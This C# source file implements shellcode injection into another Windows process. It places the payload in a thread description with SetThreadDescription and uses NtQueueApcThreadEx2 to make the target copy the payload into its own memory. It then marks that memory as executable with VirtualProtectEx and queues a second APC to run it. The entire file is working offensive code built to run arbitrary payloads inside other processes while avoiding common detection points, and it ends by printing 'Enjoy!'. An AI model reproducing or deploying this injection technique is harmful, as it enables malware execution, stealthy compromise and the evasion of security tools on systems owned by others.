using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace pi
{
    class Program
    {
        private static IntPtr MemoryOperations(IntPtr hProcess, IntPtr RemoteMemory, byte[] buf)
        {
            IntPtr remotePtr = IntPtr.Zero;
            int attempts = 0;

            while(remotePtr == IntPtr.Zero && attempts <= 20)
            {                
                byte[] arrayOne = new byte[IntPtr.Size];
                bool readMemBool = Win32.ReadProcessMemory(
                    hProcess,
                    RemoteMemory,
                    arrayOne,
                    arrayOne.Length,
                    out int lpNumberOfBytesRead
                );

                if (readMemBool == false)
                {
                    System.Threading.Thread.Sleep(1000);
                    attempts++;
                }

                remotePtr = new IntPtr(BitConverter.ToInt64(arrayOne, 0));
            }

            if (remotePtr == IntPtr.Zero)
            {
                throw new Exception($"ReadProcessMemory ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            bool changeProtectionBool = Win32.VirtualProtectEx(
                hProcess,
                remotePtr,
                buf.Length,
                Win32.PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE,
                out Win32.PAGE_PROTECTION_FLAGS lpflOldProtect
            );

            if (changeProtectionBool == false)
            {
                throw new Exception($"VirtualProtectEx ERROR! Code: {Marshal.GetLastWin32Error()}");
            }   

            Console.WriteLine($"Shellcode address: 0x{remotePtr.ToString("X")}\n");
            Console.WriteLine($"VirtualProtectEx SUCCESS! Status: {changeProtectionBool}");
            Console.WriteLine($"Old PAGE PROTECTION: {lpflOldProtect}");

            return remotePtr;
        }

        private static void QueueApc(IntPtr hThread, IntPtr ApcRoutine, IntPtr Arg1, IntPtr Arg2, IntPtr Arg3)
        {
            Win32.NTSTATUS queueApc = Win32.NtQueueApcThreadEx2(
                hThread,
                IntPtr.Zero,
                Win32.QUEUE_USER_APC_FLAGS.QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
                ApcRoutine,    
                Arg1,
                Arg2,
                Arg3
            );

            if (queueApc != Win32.NTSTATUS.Success)
            {
                throw new Exception($"NtQueueApcThreadEx2 ERROR! NTSTATUS: {queueApc}");
            }

            Console.WriteLine($"NtQueueApcThreadEx2 SUCCESS! Status: {queueApc}");
        }

        private static IntPtr GetThreadHandle(string processName)
        {

            int threadId = 0;
            foreach (var thread in Process.GetProcessesByName(processName)[0].Threads.Cast<ProcessThread>())
            {
                Console.WriteLine($"Process TID: {thread.Id}");
                threadId = thread.Id;
                break;
            }

            IntPtr hThread = Win32.OpenThread(
                Win32.THREAD_ACCESS_FLAGS.SYNCHRONIZE |
                Win32.THREAD_ACCESS_FLAGS.THREAD_SET_CONTEXT |
                Win32.THREAD_ACCESS_FLAGS.THREAD_SET_LIMITED_INFORMATION,
                false,
                threadId
            );

            if (hThread == IntPtr.Zero)
            {
                throw new Exception($"OpenThread ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            return hThread;
        }
        
        private static IntPtr GetProcessHandle(int processPid)
        {
            IntPtr hProcess = Win32.OpenProcess(
                Win32.PROCESS_ACCESS_FLAGS.QueryLimitedInformation |
                Win32.PROCESS_ACCESS_FLAGS.VirtualMemoryRead |
                Win32.PROCESS_ACCESS_FLAGS.VirtualMemoryOperation,
                false,
                processPid
            );

            if (hProcess == IntPtr.Zero)
            {
                throw new Exception($"OpenProcess ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            return hProcess;
        }

        static void Main(string[] args)
        {
            byte[] buf = File.ReadAllBytes(args[1].ToString());

            string processName = args[0].ToString();
            Process[] localByName = Process.GetProcessesByName(processName);

            IntPtr hProcess = GetProcessHandle(localByName[0].Id);
            IntPtr hThread = GetThreadHandle(processName);
            IntPtr SpareULongs = Peb.GetFieldFromPeb(hProcess);
            
            int setThreadDesc = Wrapper.MySetThreadDescription(hThread, buf);
            
            if (setThreadDesc != 268435456)
            {
                throw new Exception($"MySetThreadDescription() ERROR! Code: {Marshal.GetLastWin32Error()}. Try using default API?");
            }

            Console.WriteLine($"OpenThread SUCCESS! Handle: {hThread}");
            Console.WriteLine($"OpenProcess SUCCESS! Handle: {hProcess}");

            Console.WriteLine($"SetThreadDescription SUCCESS! Value: S_OK\n");
            Console.WriteLine($"Remote Process's MEMORY: 000000{SpareULongs.ToString("X")}");

            IntPtr GetThreadDescriptionApc = Functions.GetFunctionAddressEx("kernel32.dll", "GetThreadDescription", hProcess, localByName[0].Id);

            QueueApc(
                hThread,
                GetThreadDescriptionApc,
                new IntPtr(-2), // pseudo handle (NtCurrentThread)
                SpareULongs,
                IntPtr.Zero
            );

            IntPtr remotePtr = MemoryOperations(hProcess, SpareULongs, buf);
            Win32.CloseHandle(hProcess);
            
            QueueApc(
                hThread,
                remotePtr,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
            );

            Win32.CloseHandle(hThread);
            Console.WriteLine("\nEnjoy!");
        }
    }
}